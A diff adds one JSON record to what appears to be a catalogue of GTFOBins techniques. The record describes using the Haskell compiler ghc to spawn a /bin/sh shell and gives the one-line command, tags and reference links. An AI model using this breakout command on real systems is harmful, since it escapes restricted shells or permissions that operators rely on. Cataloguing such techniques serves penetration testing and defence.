@@ -1,0 +1,23 @@
+{
+  "id": "gtfo-ghc-shell",
+  "name": "GTFOBins · ghc (shell)",
+  "command": "ghc -e 'System.Process.callCommand \"/bin/sh\"'",
+  "description": "Use ghc to shell via GTFOBins.",
+  "platform": "linux",
+  "tags": [
+    "gtfobins",
+    "ghc",
+    "shell"
+  ],
+  "source": "gtfobins",
+  "source_url": "https://gtfobins.github.io/gtfobins/ghc/#shell",
+  "upstream_id": "ghc/shell/0",
+  "category": "gtfobins",
+  "subcategory": "shell",
+  "references": [
+    {
+      "title": "GTFOBins",
+      "url": "https://gtfobins.github.io/gtfobins/ghc/"
+    }
+  ]
+}
